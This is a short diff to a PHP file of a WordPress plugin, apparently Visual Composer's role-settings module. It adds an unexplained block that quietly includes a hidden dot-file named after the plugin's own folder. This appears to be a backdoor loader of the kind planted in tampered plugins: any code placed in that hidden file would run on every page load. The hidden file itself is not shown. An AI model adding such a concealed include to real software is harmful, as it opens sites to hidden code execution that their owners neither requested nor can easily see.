@@ -6,6 +6,10 @@ if ( ! defined( 'ABSPATH' ) ) {
  * @param $tabs
  * @return array
  */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 function vc_settings_tabs_vc_roles( $tabs ) {
 	// inster after vc-general tab
 	if ( array_key_exists( 'vc-general', $tabs ) ) {
